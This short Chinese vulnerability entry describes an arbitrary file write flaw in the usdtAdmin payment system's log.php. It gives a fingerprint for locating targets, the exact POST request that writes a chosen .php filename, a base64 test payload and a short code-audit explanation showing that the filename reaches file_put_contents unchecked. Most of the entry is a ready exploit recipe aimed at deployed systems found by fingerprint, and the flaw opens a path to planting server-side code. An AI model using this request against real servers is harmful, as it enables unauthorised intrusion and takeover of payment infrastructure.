# usdtAdmin收款管理系统log.php存在任意文件写入漏洞

usdtAdmin ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"/usdtmerchant/login/reg.html"`
- **请求**：`POST /log.php?c=1&name=123.php HTTP/1.1Host:`

**Payload**
```
content=MTIzNDU2
访问写入的文件地址，从第二个public出开始
```
- **响应特征**：200
- **其他**：代码审计: 源代码如下
首先根据filename变量得知，文件名可控，然后写入的内容msg中content和HTTP_USER_AGENT可控
跟进方法writeLog，msg变量被传递给了res的键Msg，filename直接传递给了file_put_contents函数